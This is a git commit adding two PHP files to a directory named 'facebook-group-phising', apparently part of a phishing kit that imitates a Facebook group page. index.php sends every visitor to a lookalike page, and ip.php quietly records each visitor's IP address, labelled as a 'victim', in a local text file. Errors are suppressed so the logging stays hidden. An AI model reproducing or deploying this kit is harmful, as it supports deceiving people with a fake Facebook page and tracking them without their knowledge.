2f567111edfefd5b7de1473c37bd2f0e28876f22
Abir Hossain <84902162+ABIRHOSSAIN10@users.noreply.github.com>
2021-10-13 15:21:05 +0600

    Add files via upload

---
+++ site/facebook-group-phising/index.php
@@ -0,0 +1,9 @@
+<?php include 'ip.php';?>
+<script type="text/javascript">
+if (screen.width <= 699) {
+document.location = "group-main.html";
+}
+else {
+document.location = "group-main.html";
+}
+</script> 
---
+++ site/facebook-group-phising/ip.php
@@ -0,0 +1,26 @@
+<?php
+error_reporting(0);
+ini_set('display_errors', 0);
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = "User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+$file = 'ip.txt';
+$victim = "IP: ";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $victim);
+
+fwrite($fp, $ipaddress);
